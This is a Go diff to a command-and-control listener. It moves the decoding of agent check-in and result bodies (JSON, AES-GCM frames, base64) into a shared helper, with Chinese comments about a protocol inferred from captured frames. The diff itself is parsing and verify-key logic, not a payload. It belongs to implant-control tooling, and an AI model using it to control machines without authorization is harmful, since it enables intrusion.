@@ -283,28 +283,27 @@ func (cl *C2Listener) handleCheckin(w http.ResponseWriter, r *http.Request) {
 	}
 	defer r.Body.Close()
 
+	// 请求体形态：明文 JSON / 消息帧 / base64(帧) / base64(JSON)。
+	// 见 c2engine/agent_body.go：这是两端历史漂移的兼容层，新客户端应只发裸帧。
+	engine := GetEngine()
+	listener := engine.GetListener(cl.ID)
+	salt := ""
+	if listener != nil {
+		salt = listener.EncryptSalt
+	}
+	payload, _, derr := DecodeAgentBody(body, salt)
+	if derr != nil {
+		http.Error(w, "Bad request", http.StatusBadRequest)
+		return
+	}
+
 	var req CheckinRequest
-	if err := json.Unmarshal(body, &req); err != nil {
-		// Fall back to the agent transport frame (AES-256-GCM,
-		// <u32 LE len><[12B nonce][ct][16B tag]>) when the listener has a salt.
-		// 帧密钥 = FrameSaltKey(EncryptSalt)；AEAD 参数系由捕获帧推断（见 protocol.go）。
-		engine := GetEngine()
-		listener := engine.GetListener(cl.ID)
-		if listener != nil && listener.EncryptSalt != "" {
-			pt, ferr := FrameDecrypt(body, listener.EncryptSalt)
-			if ferr != nil || json.Unmarshal(pt, &req) != nil {
-				http.Error(w, "Bad request", http.StatusBadRequest)
-				return
-			}
-		} else {
-			http.Error(w, "Bad request", http.StatusBadRequest)
-			return
-		}
+	if err := json.Unmarshal(payload, &req); err != nil {
+		http.Error(w, "Bad request", http.StatusBadRequest)
+		return
 	}
 
 	// Verify the agent's key
-	engine := GetEngine()
-	listener := engine.GetListener(cl.ID)
 	if listener != nil && listener.VerifyKey != "" {
 		if req.VerifyKey != listener.VerifyKey {
 			Logf("Listener %d: rejected agent with wrong verify key from %s", cl.ID, r.RemoteAddr)
@@ -447,38 +446,32 @@ func (cl *C2Listener) handlePostResult(w http.ResponseWriter, r *http.Request) {
 
 	var req ResultRequest
 	var rawBody []byte
-	if err := json.Unmarshal(body, &req); err != nil {
-		// Agent transport frame fallback, same as check-in: the HTTP transport
-		// GCM-wraps the result body.
-		engine := GetEngine()
-		listener := engine.GetListener(cl.ID)
-		if listener == nil || listener.EncryptSalt == "" {
+	engine := GetEngine()
+	listener := engine.GetListener(cl.ID)
+	salt := ""
+	if listener != nil {
+		salt = listener.EncryptSalt
+	}
+	payload, framed, derr := DecodeAgentBody(body, salt)
+	if derr != nil {
+		http.Error(w, "Bad request", http.StatusBadRequest)
+		return
+	}
+	if json.Unmarshal(payload, &req) != nil {
+		// 帧内不是 JSON：可能是原版的结果记录块（严格增量路径，当前无生产者，
+		// 见下方记录块一节）。只有帧封装才允许走这条路——明文非 JSON 一律拒绝。
+		if !framed {
 			http.Error(w, "Bad request", http.StatusBadRequest)
 			return
 		}
-		pt, ferr := FrameDecrypt(body, listener.EncryptSalt)
-		if ferr != nil {
-			http.Error(w, "Bad request", http.StatusBadRequest)
-			return
-		}
-		rawBody = pt
-		// 帧内载荷有两种形态：
-		//   1. 早期复刻端的 ResultRequest JSON —— 当前唯一有生产者的形态
-		//      （agent/transport_real.go 的 SendResult）
-		//   2. 结果记录块 —— 严格增量的容错路径，当前无生产者，形态为
-		//      复刻端定义的契约而非原版事实（见下方记录块一节）
-		// 只有两者都不是才拒绝；此处不早退，交由下面的分支判定。
-		if json.Unmarshal(pt, &req) != nil {
-			req = ResultRequest{}
-		}
+		req = ResultRequest{}
+		rawBody = payload
 	}
 
 	// 记录块判定：JSON 里没有 CommandID/Result，且帧内载荷通过记录块的形状校验
 	// （见 DecodeAgentResultBlock：0x54 终止记录 + 长度自洽）。原版记录块不带
 	// VerifyKey（凭据来自连接本身），因此不能拿 ResultRequest 的凭据规则去套它。
 	recordBlock := req.CommandID == 0 && req.Result == "" && IsAgentResultBlock(rawBody)
-
-	engine := GetEngine()
 
 	if recordBlock {
 		// 记录块路径：原版不在记录里回传 client id / task id / verify key
@@ -510,7 +503,6 @@ func (cl *C2Listener) handlePostResult(w http.ResponseWriter, r *http.Request) {
 	// The verify key is the only credential on the result channel: without it,
 	// any remote caller could forge results (including fake terminal/screen
 	// streams) for any client.
-	listener := engine.GetListener(cl.ID)
 	if listener != nil && listener.VerifyKey != "" {
 		if req.VerifyKey != listener.VerifyKey {
 			http.Error(w, "Unauthorized", http.StatusUnauthorized)
